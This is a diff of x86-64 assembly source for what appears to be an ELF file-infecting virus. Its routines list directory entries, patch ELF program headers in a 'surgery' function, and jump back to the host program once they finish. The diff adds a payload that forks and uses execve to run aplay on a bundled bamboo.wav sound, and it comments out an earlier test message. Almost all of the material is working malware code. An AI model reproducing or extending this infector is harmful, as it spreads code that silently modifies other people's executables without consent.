@@ -50,8 +50,46 @@ strlen_loop:
 strlen_done:
     ret
 
-; TODO: actual surgery (will remove direntptr as argument)
-; usage: push direntptr ; push fd ; call surgery
+payload:
+    mov rax, 0x3
+    xor rdi, rdi
+    syscall
+
+    mov rax, 0x3
+    inc rdi
+    syscall
+
+    mov rax, 0x3
+    inc rdi
+    syscall
+
+    sub rsp, 0x40
+    mov rax, "/usr/bin"
+    mov qword [rsp+0x30], rax
+    mov rax, "/aplay"
+    mov qword [rsp+0x38], rax
+    mov rax, "/usr/sha"
+    mov qword [rsp+0x18], rax
+    mov rax, "re/bambo"
+    mov qword [rsp+0x20], rax
+    mov rax, "o.wav"
+    mov qword [rsp+0x28], rax
+    mov qword [rsp+0x10], 0
+    lea rax, [rsp+0x18]
+    mov qword [rsp+0x8], rax
+    lea rdi, [rsp+0x30]
+    mov qword [rsp], rdi
+
+    mov rax, 0x3b
+    mov rsi, rsp
+    xor rdx, rdx
+    syscall
+
+    xor rdi, rdi
+    mov rax, 0x3c
+    syscall
+
+; usage: push fd ; call surgery
 surgery:
     push rbp
     mov rbp, rsp
@@ -97,6 +135,7 @@ surgery:
     syscall
     ; leave space for e_phnum (2)
     add rsp, 0x6
+    ; sub rsp, 0x2
 
     ; seek to e_phnum (2)
     mov rax, 0x8
@@ -413,18 +452,23 @@ lsdirents_done:
 end:
     ; TODO: this is where the payload goes
     ; between here
-    mov rax, 0x1
-    mov rdi, 0x1
-    sub rsp, 0x4
-    mov word [rsp], ":)"
-    mov byte [rsp+2], 0xa
-    mov byte [rsp+3], 0x0
-    mov rsi, rsp
-    mov rdx, 0x3
-    syscall
-    ; and here
+    ; mov rax, 0x1
+    ; mov rdi, 0x1
+    ; sub rsp, 0x4
+    ; mov word [rsp], ":)"
+    ; mov byte [rsp+2], 0xa
+    ; mov byte [rsp+3], 0x0
+    ; mov rsi, rsp
+    ; mov rdx, 0x3
+    ; syscall
     mov rsp, rbp
     pop rbp
+
+    mov rax, 0x39
+    syscall
+    test rax, rax
+    jz payload
+    ; and here
     jmp regular_program_address
 
 symbols:
